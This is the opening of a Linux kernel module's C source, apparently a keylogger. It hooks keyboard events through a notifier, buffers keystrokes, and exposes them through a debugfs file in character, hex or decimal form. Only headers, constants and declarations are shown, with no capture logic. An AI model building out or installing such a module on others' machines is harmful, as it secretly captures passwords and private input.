#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#define BUF_SIZE (PAGE_SIZE << 2) // 16kb buffer size
#define KEYCODE_LEN 12 // Maximum length of a keycode string
#define US 0 // Type code for US character log
#define HEX 1 // Type code for hexadecimal log
#define DEC 2 //Type code for decimal log

// Declarations
static int codes; // User-specified log pattern
module_param(codes, int, 0644);
MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");

// Debugfs structures
static struct dentry *file;
static struct dentry *subdir;

// Function to handle read operations on the debugfs file
static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);

// Keyboard notifier callback function invoked on keyboard events
static int kb_callback(struct notifier_block *nblock, unsigned long code, void *_param);

